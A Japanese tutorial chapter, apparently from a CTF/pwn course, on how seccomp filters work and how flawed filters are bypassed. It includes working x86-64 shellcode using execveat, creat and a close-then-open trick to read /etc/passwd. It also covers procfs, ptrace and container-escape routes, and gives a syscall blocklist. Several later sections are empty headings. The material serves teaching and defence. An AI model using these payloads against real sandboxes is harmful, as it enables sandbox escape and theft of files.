---
title: seccompの回避
date: 2022-02-05 12:43:00
tags:
    - [Linux]
    - [Userland]
    - [shellcode]
    - [seccomp]
lang: ja

pagination: true
bk: restricted.html
fd: egg_hunter.html
---
Linuxではseccompと呼ばれるサンドボックス機構が提供されています。seccompは正しく使えば非常に強力ですが、フィルタの設定を誤ると簡単に回避できてしまいます。この章ではseccompの様々な回避手法について紹介します。

## seccomp
seccompの回避方法について勉強する前に、seccompの仕組みについて知っておきましょう。

### seccompとは
seccompはLinuxに実装されている、システムコール呼び出しを制限するための機構です。
これを利用すると、特定のシステムコールだけを許可したり、逆に特定のシステムコールを拒否（異常終了やエラー番号返却）したりできます。

Linuxには古くからネットワークパケットをフィルタリングするためのeBPFという機能がありました。
eBPFの仕組みは現在ネットワーク以外にも活用されており、seccompもこのeBPFという機能を使って実現されています。
ネットワーク用eBPFはパケットの送受信をトリガーとしてフィルタを実行しますが、seccompはシステムコール呼び出しを起点としてフィルタルールを実行します。
eBPFの[脆弱性を悪用する講義](../../linux-kernel/LK06/ebpf)もあるのでお楽しみに！

### seccompの使い方
seccompはeBPFのフィルタとして記述されます。
まずはこのフィルタを読み書きする方法を簡単に知っておきましょう。

### seccomp-tools
seccompルールはアセンブリ言語のような形で記述します。
このフィルタをきちんと書くのは大変なので、[libseccomp](https://github.com/seccomp/libseccomp)といった簡単にルールを記述できるライブラリもあります。

我々は実装するアプリケーションにseccompを取り入れたいのではなく、seccompのルールを簡単に読み書きしたいだけなので、もっと簡単なツールを使いましょう。
それが[seccomp-tools](https://github.com/david942j/seccomp-tools)です。以下の公式リポジトリを参考にインストールしてください。

https://github.com/david942j/seccomp-tools

このツールは以下の操作ができます。

- 実行中のプログラムに適用されたseccompルールの表示
- seccompルール（フィルタ）のバイトコードの逆アセンブル
- seccompルール（フィルタ）のアセンブリコードのアセンブル
- seccompルールのエミュレート（ここでは紹介しない）

使い方は公式リポジトリに書いてある通りです。

例えば次のようなファイル`filter.asm`を用意します。
```
 A = sys_number
 A == execve ? dead : next
 A == execveat ? dead : next
 return ALLOW
dead:
 return KILL
```
このルールは、まずA（レジスタの名前）に`sys_number`（呼び出されたシステムコール番号）を代入します。
次に、2,3行目でそれぞれシステムコール番号が`execve`, `execveat`であるかを確認しています。3項演算子によって、一致していればdeadに、そうれなければnext（次の命令）にジャンプします。
いずれとも一致していなければ`ALLOW`を返し、一致していればdeadにジャンプして`KILL`を返しています。

これをseccomp-toolsでアセンブルしてみましょう。
```
$ seccomp-tools asm filter.asm
" \x00\x00\x00\x00\x00\x00\x00\x15\x00\x02\x00;\x00\x00\x00\x15\x00\x01\x00B\x01\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x00\x00"
```
上記のルールが変換されたバイナリになります。他にも、例えばC言語のソースコード形式にも変換できます。
```
$ seccomp-tools asm filter.asm -f c_source
#include <linux/seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>

static void install_seccomp() {
  static unsigned char filter[] = {32,0,0,0,0,0,0,0,21,0,2,0,59,0,0,0,21,0,1,0,66,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0};
  struct prog {
    unsigned short len;
    unsigned char *filter;
  } rule = {
    .len = sizeof(filter) >> 3,
    .filter = filter
  };
  if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) { perror("prctl(PR_SET_NO_NEW_PRIVS)"); exit(2); }
  if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0) { perror("prctl(PR_SET_SECCOMP)"); exit(2); }
}
```
この続きとして次のソースコードを追加し、コンパイル・実行してみましょう。
```c
#include <unistd.h>

int main() {
  install_seccomp();
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  return 0;
}
```
まずはseccomp-toolsでルールを確認します。
```
$ seccomp-tools dump ./a.out 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
```
書いたルールと一致していることが分かります。dumpコマンドはseccompルールがprctlで適用される瞬間をフックしているので、該当箇所までプログラムを動かさないとダンプは表示されません。

さて、プログラムを実行すると強制終了するはずです。
```
$ ./a.out 
間違ったシステムコール (コアダンプ)
```
dmesgを見ると次のようなログが残っています。
```
[18262.311828] audit: type=1400 audit(1684681201.394:39): apparmor="DENIED" operation="capable" class="cap" profile="/usr/sbin/cupsd" pid=24470 comm="cupsd" capability=12  capname="net_admin"
[20937.741402] audit: type=1326 audit(1684683876.811:40): auid=1000 uid=1000 gid=1000 ses=3 subj=unconfined pid=27128 comm="a.out" exe="/path/to/a.out" sig=31 arch=c000003e syscall=59 compat=0 ip=0x7fa5050eb0fb code=0x0
```
注目すべきは`syscall=59`の部分です。59番は`execve`なので、このシステムコールがseccompルールに弾かれて異常終了していることが分かります。

このように、seccompルールを使うと、呼び出されたシステムコールの番号や、引数の値によってシステムコールの発行を許可・拒否できます。

### 禁止すべきシステムコール
では、seccompを使ってどのようなシステムコールを禁止すれば良いのでしょうか。プログラムや保護したいものによりますが、一般的には任意コマンド実行や任意ファイル読み書きを防ぐ目的で使われます。
コマンド実行に関しては次のシステムコールを禁止すれば十分です。

- `execve`
- `execveat`

また、ファイル読み書きに関しては次のシステムコールを禁止します。`creat`は忘れがちなので注意が必要ですね。

- `creat`
- `open`
- `openat`
- `openat2` (Linux 5.6以降で追加)

もしプログラムがroot権限で動いているなら、ファイルopenに関して次のシステムコールも禁止する必要があります。（当然root権限の場合は他にもたくさんのシステムコールを禁止しないといけないです。）

- `name_to_handle_at`
- `open_by_handle_at`

DoSなどの悪さを禁止するなら、他にも

- `clone`
- `fork` / `vfork`
- `kill` / `tkill` / `tgkill`
- `prlimit64`

などさまざまなシステムコールを禁止する必要があります。
このように、seccompをブラックリスト方式で使うのは非常に大変です。そのため、特別な理由がない限りはプログラムが使う安全なシステムコールのみを許可するホワイトリスト方式で使用しましょう。

## ブラックリストの不備
ここからはseccompの回避方法について説明します。まず、ブラックリスト方式を利用した際の不備を悪用する方法を紹介します。

ここからはたくさんのseccompルールが登場します。毎回書きたくない方は[LU-seccomp]()をダウンロードしてください。以下のように使えます。
```sh
$ make 01-filter    # filter.binを生成
$ ./lu-seccomp
<ここにシェルコードを入力>
$ python test.py    # ptrlibでシェルコードを実行
```

### openatとexecveat
まず典型的なミスは、`execve`や`open`だけ禁止して、`execveat`や`openat`などの同等の機能を備えたマイナーなシステムコールを禁止し忘れるパターンです。
次のルール（`01-filter`）を見てみましょう。
```
$ make 01-filter
$ seccomp-tools dump ./lu-seccomp
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x02 0x00 0x40000000  if (A >= 0x40000000) goto 0006
 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x06 0x00 0x00 0x00000000  return KILL
```
`execve`を禁止していますが、`execveat`が許可されています。したがって、次のようなコードで任意コマンド実行できます。
```asm
xor r10d, r10d
xor eax, eax
push rax
lea rsi, [rel argv1]
push rsi
lea rsi, [rel argv0]
push rsi
mov rdx, rsp
mov edi, -100
mov eax, {syscall.x64.execveat}
syscall

argv0: db "/bin/ls", 0
argv1: db "-lha", 0
```
なお、**seccompルールは子プロセスにも引き継がれる**ため、`/bin/sh`のように内部で`execve`を使うプログラムは起動しても意味がありません。

### creatとprocfs
次のルール（`02-filter`）を見てみましょう。
```
$ make 02-filter
$ seccomp-tools dump ./lu-seccomp 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
 0004: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0008
 0005: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0008
 0006: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```
seccomp-toolsは新しいシステムコールをうまく表示できないことがありますが、line 6は`openat2`を禁止しています。`creat`が禁止されていないので、これを使ってファイルが読めるでしょうか。
```
mov esi, 0400
lea rdi, [rel pathname]
mov eax, {syscall.x64.creat}
syscall
test rax, rax
jl error

mov edx, 0x100
mov rsi, rsp
mov edi, eax
mov eax, {syscall.x64.read}
syscall

mov edx, 0x100
mov rsi, rsp
mov edi, 1
mov eax, {syscall.x64.write}
syscall
hlt

error:
mov edx, 17
lea rsi, [rel s_warn]
mov edi, 1
mov eax, {syscall.x64.write}
syscall

s_warn: db "Cannot open file", 0x0a, 0
pathname: db "/etc/issue", 0
```
残念ながら通常ファイルを読むことはできません。`creat`は新規で空ファイルを生成するため、ファイルの内容が空になってしまいます。上の例では書き換え権限がないファイルを開こうとするためエラーになります。（書き換え可能な一般ファイルを指定すると中身が空になるので注意してください。）

しかし、`fork`型プロセスで親プロセスと子プロセスが通信するタイプのシステムで子プロセスのみにseccompがかかっている場合、親プロセスの`/proc/<pid>/mem`を開くことができます。この場合、seccompがかかっていない親プロセスのメモリを書き換えられるため、サンドボックス回避に成功します。
このように、`fork`型のシステムでは`open`系のシステムコールを使い、procfs経由で親プロセスを操作できるため注意が必要です。

また、プログラムが`CAP_DAC_READ_SEARCH`権限を持っている場合、同様にファイルをオープンできる`open_by_handle_at`システムコールも禁止しなくてはなりません。

### ptrace, process\_vm\_readv, process\_vm\_writev
procfsの例と同様に、`fork`親プロセスのメモリやレジスタを操作できるシステムコールがいくつかあります。

`ptrace`はプロセスを操作する代表的なシステムコールです。メモリの読み書きだけでなくレジスタの操作やステップ実行などプロセスに対するあらゆる操作が可能です。`ptrace`が禁止されていない場合、通常`fork`型では親プロセスを操作できます。
同様に、`process_vm_readv`, `process_vm_writev`というシステムコールがあります。これらは名前の通りプロセスのメモリを読み書きするためのシステムコールで、`ptrace`と同様に禁止を忘れると、`fork`型の場合親プロセスのメモリを操作できます。

以上は直接的にプロセスのメモリを操作するシステムコールですが、他のプロセスに影響を与えるシステムコールは他にも多数あります。
代表的なものは`kill`, `prlimit64`などで、いずれも直接exploitには活用できませんが、状況によってはサンドボックス回避に役立ちます。pidを引数に取るようなシステムコールには注意しましょう。

### コンテナエスケープ
どうしてもブラックリストルールを使う必要がある例として、dockerのようなコンテナが挙げられます。さまざまなユーザープログラムが動くコンテナでは、特定のシステムコールだけを利用可能にすることは非現実的です。

root権限を明け渡す可能性が高いコンテナでは、より多くのシステムコールを禁止する必要があります。
例えば`ptrace`を許可してしまうとルートプロセスを乗っ取られてしまったり、`open_by_handle_at`が使えるとコンテナの外側のファイルを操作できてしまったり[^1]というコンテナエスケープの脆弱性に繋がります。

コンテナが禁止すべきシステムコールは以下のDockerドキュメントを参考にすると良いです。

https://docs.docker.com/engine/security/seccomp/

[^1]: Dockerで該当脆弱性があり、Shockerという名前で有名です。

## ホワイトボックスの不備
ホワイトボックスルールでも、当然これまで述べてきたような悪用されやすいシステムコールが許可されていれば問題になります。
それ以外にも、引数の検証で安全性を担保しようとすると、ミスが発生しやすいです。

### 引数の確認不備
3番目のルールを確認してみましょう。
```
$ make 03-filter
$ seccomp-tools dump ./lu-seccomp 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
 0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
 0005: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0015
 0006: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0009
 0007: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0012
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 0009: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0010: 0x15 0x04 0x00 0x00000000  if (A == 0x0) goto 0015
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0013: 0x15 0x01 0x00 0x00000001  if (A == 0x1) goto 0015
 0014: 0x06 0x00 0x00 0x00000000  return KILL
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
このルールは`open`, `read`, `write`, `close`のみを許可するホワイトボックスルールです。任意ファイルを読み書きできないように、`read`, `write`の引数を確認し、それぞれstdin(=0), stdout(=1)への読み書きしか許可していません。

安全に見えるかもしれませんが、次のようなコードで回避できます。
```asm
xor edi, edi
mov eax, {syscall.x64.close}
syscall

xor esi, esi
lea rdi, [rel pathname]
mov eax, {syscall.x64.open}
syscall

mov edx, 0x1000
mov rsi, rsp
mov edi, eax
mov eax, {syscall.x64.read}
syscall

mov edx, eax
mov rsi, rsp
mov edi, 1
mov eax, {syscall.x64.write}
syscall

pathname: db "/etc/passwd", 0
```
このシェルコードでは、最初に`close`でstdinを閉じています。したがって、次の`open`で`/etc/passwd`を開いたときにファイルディスクリプタとして0番が選ばれ、`read`の引数チェックを回避できます。

stdinとstdoutの`close`を禁止するルールを書けば安全になります。

## サイドチャネル攻撃
メモリ上の情報漏洩が目的で、コマンド実行などが不要な場合もあります。このような場合はシステムコールを利用せずに情報漏洩が可能かもしれません。

### エラーの観測


### 処理時間の計測



## アーキテクチャとシステムコール番号の検証不備
適切にホワイトリスト・ブラックリスト方式を実装していても問題が起きるケースを紹介します。

### アーキテクチャの検証不備

### x32 ABIの利用



## その他の回避手法

### カーネルやライブラリの欠陥の利用

### 他プロセスの悪用

#### kill, tkill, tgkill


#### prlimit64

----

<div class="column" title="例題１">
</div>

[☞ 例題の解答](seccomp-answer.html)
